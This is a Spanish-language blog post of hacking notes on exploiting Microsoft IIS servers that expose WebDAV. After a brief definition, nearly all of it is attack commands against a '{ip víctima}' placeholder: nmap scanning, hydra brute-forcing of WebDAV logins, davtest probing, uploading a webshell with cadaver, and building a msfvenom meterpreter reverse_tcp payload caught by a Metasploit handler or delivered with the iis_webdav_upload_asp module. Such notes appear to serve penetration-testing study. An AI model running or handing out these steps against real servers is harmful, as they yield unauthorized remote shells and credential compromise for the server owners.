---
title: 'Servidores IIS'
description: 'Notas sobre cómo explotarlo'
pubDate: 2024-01-24
author: 'Nicolas Riquelme'
tags: ["Hacking", "Windows", "server", "web", "discover"]
tableOfContents:
  minHeadingLevel: 2
  maxHeadingLevel: 3
---
# IIS
IIS (Internet Information Services) es un servidor web propietario de MS Windows. Se puede usar tanto para páginas web como para aplicaciones. 
## WebDAV
Extensión de servidor que convierte el servidor web IIS en un servidor de archivos en red.
# Explotación de vulnerabilidades
Kos programas más usados para vulnerar servidores IIS con WebDAV son davtest y cadaver.
```ruby
nmap -sV -sC {ip víctima} 	# Realizamos un escaneo de los 1000 puertos más importantes, listando las versiones de los servicios detectados y uasndo los scripts de escaneo por defecto.

nmap -sV -p80 --script=http-enum {ip víctima} # Nos dará información más detallada sobre el servidor WebDAV

hydra -L {path a diccionario de nombres de usuario} -P {path a diccionario de contraseñas} {ip víctima} http-get /webdav/
```

## Davtest
```ruby
davtest -url {http://ip víctima}		# Nos indicará si el servidor está activo
davtest -auth {usuario}:{password} -url {http://ip víctima}/webdav		# Realizará un completo test de explotación que abarca los permisos disponibles para el usuario aportado.
```

## Cadaver
```ruby
cadaver {http://ip víctima/webdav} # Nos pedirá que introduzcamos las credenciales y nos abrirá una shell directamente en el servidor webDAV
	put /usr/share/webshells/{webshell}		# La webshell dependerá de las extensiones que permita ejecutar el servidor.
```
Una vez subida la webshell, abrimos el navegador y ejecutamos la webshell desde allá.

## Metasploit
### Opción 1: generando el payload con msfvenom
```ruby
msfvenom -p windows/meterpreter/reverse_tcp LHOST={ip local} LPORT={puerto} -f {formato} > shell.{formato}
```
Una vez generado el payload, lo subimos usando cadaver. Una vez subido, pero antes de ejecutarlo, procedemos a abrir metasploit para configurar la escucha.
```ruby
use multi/handler
	set payload windows/meterpreter/reverse_tcp			# hay que usar el mismo que el usado para generar el payload
	set lhost {ip local}
	set lport {puerto}
	run
```
Ahora que está a la escucha, podemos proceder a ejecutar el payload desde el navegador web, lo cual nos abrirá una shell de meterpreter en la consola en la que estábamos a la escucha.

### Opción 2 (si webdav permite la ejecución de archivos ASP): usando un módulo específico
Podemos hacer lo mismo, pero sin salir de metasploit.
```ruby
use exploit/windows/iis/iis_webdav_upload_asp
	set HttpUsername {usuario}
	set HttpPassword {password}
	set lhost {ip local}
	set lport {puerto}
	set rhost {ip víctima}
	set rport {puerto}
	set path /webdav/{nombre del payload}.asp
	exploit
```
